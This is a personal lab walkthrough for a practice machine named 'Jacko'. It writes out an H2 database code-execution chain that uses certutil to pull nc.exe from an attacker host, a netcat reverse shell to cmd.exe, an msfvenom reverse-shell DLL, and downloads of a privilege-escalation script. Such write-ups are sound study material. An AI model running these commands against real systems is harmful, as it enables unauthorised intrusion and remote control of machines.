# Jacko

Sanitized practice-box notes. Folder layout matches the Obsidian template: **General Info → External (per port) → Exploit → Internal / Priv Esc → Loot**, with **Evidence** next to the phase where the screenshot was taken.

| | |
| --- | --- |
| OS (guess from ports) | Unknown |
| Notes | Personal walkthrough, not a spoiler-free writeup |

## Layout

- [General Info](General-Info.md)
- [Exploit](Exploit.md)
- [Loot](Loot.md)
- [External](External/) — per-port enumeration
- [Internal / Priv Esc](Internal/Priv-Esc.md)

### Ports touched

- `135-RPC`
- `139-netbios-ssn`
- `7680-pando-pub`
- `80-http`
- `8082-http`

## Attack notes

all I did was copy and paste these three lines into the terminal and ran the querys and I got code execution! Needed to transfer nc.exe over to the target CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval"; CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://ATTACKER:80/nc.exe C:/Windows/temp/nc.exe").getInputStream()).useDelimiter("\\Z").next()'); I ran nc.exe ATTACKER 80 -e cmd.exe and now I have a shell

### Commands used

```bash
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
msfvenom -p windows/shell_reverse_tcp -f dll -o UninOldIS.dll LHOST=ATTACKER LPORT=8082
certutil -urlcache -split -f http://ATTACKER:80/UninOldIS.dll C:/Windows/Temp/UninOldIS.dll
certutil -urlcache -split -f http://ATTACKER:80/49382.ps1 C:/Windows/Temp/49382.ps1
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
```

### References

- https://www.exploit-db.com/exploits/49384

## Evidence

![Pasted image 20240629182846.png](Evidence/Pasted%20image%2020240629182846.png)

![Pasted image 20240629182925.png](Evidence/Pasted%20image%2020240629182925.png)

![Pasted image 20240629184313.png](Evidence/Pasted%20image%2020240629184313.png)

![Pasted image 20240629184533.png](Evidence/Pasted%20image%2020240629184533.png)

![Pasted image 20240629184508.png](Evidence/Pasted%20image%2020240629184508.png)

![Pasted image 20240629193154.png](Internal/Evidence/Pasted%20image%2020240629193154.png)

![Pasted image 20240629185002.png](Internal/Evidence/Pasted%20image%2020240629185002.png)

![Pasted image 20240629190340.png](Internal/Evidence/Pasted%20image%2020240629190340.png)

![Pasted image 20240629190746.png](Internal/Evidence/Pasted%20image%2020240629190746.png)

![Pasted image 20240629184723.png](Internal/Evidence/Pasted%20image%2020240629184723.png)

![Pasted image 20240629192859.png](Internal/Evidence/Pasted%20image%2020240629192859.png)

![Pasted image 20240629184624.png](Internal/Evidence/Pasted%20image%2020240629184624.png)
